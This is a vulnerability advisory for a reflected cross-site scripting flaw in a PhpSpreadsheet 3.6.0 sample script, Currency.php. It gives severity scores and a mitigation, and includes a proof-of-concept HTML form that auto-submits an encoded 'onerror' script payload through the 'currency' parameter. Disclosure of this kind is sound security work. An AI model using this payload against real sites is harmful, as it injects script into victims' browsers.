summary: "PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file\n# Unauthorized\
  \ Reflected XSS in `Currency.php` file\n\n**Product**: Phpspreadsheet\n**Version**: version\
  \ 3.6.0\n**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site\
  \ Scripting')\n**CVSS vector v.3.1**: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n**CVSS vector\
  \ v.4.0**: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n**Description**:\
  \ using the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php` script,\
  \ an attacker can perform XSS-type attack\n**Impact**: executing arbitrary JavaScript code\
  \ in the browser\n**Vulnerable component**: the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php`\
  \ file\n**Exploitation conditions**: an unauthorized user\n**Mitigation**: sanitization of\
  \ the `currency` variable\n**Researcher**: Aleksey Solovev (Positive Technologies)\n\n# Research\n\
  \nThe researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting\
  \ (XSS) (in `Currency.php` file) in Phpspreadsheet.\n\nThere is no sanitization in the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php`\
  \ file, which leads to the possibility of a XSS attack.\nStrings are formed using the `currency`\
  \ parameter without sanitization, controlled by an attacker.\n\n![fig9](https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c)\n\
  \n*Figure 9.  A fragment of the query in which a string and a parameter are formed without\
  \ sanitization*\n\nAn attacker can prepare a special HTML form that will be automatically\
  \ sent to the vulnerable scenario.\n\n*Listing 5. HTML form that demonstrates the exploitation\
  \ of the XSS vulnerability*\n\n```\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional\
  \ -->\n  <body>\n    <form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php\"\
  \ method=\"POST\">\n      <input type=\"hidden\" name=\"number\" value=\"1234&#46;5678\" />\n\
  \      <input type=\"hidden\" name=\"currency\" value=\"&#36;&apos;&quot;&lt;img&#32;src&#61;1&#32;onerror&#61;alert&#40;&#41;&gt;\"\
  \ />\n      <input type=\"hidden\" name=\"decimals\" value=\"2\" />\n      <input type=\"\
  hidden\" name=\"position\" value=\"1\" />\n      <input type=\"hidden\" name=\"spacing\" value=\"\
  0\" />\n      <input type=\"hidden\" name=\"submit\" value=\"Display&#32;Mask\" />\n     \
  \ <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('',\
  \ '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n\n\
  After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure\
  \ 10 shows the execution of arbitrary JavaScript code during the submission of a POST form.\
  \ \n\n<img width=\"428\" alt=\"fig10\" src=\"https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335\"\
  \ />\n\n*Figure 10. Executing arbitrary JavaScript code*\n\n# Credit\nThis vulnerability was\
  \ discovered by **Aleksey Solovev (Positive Technologies)**"
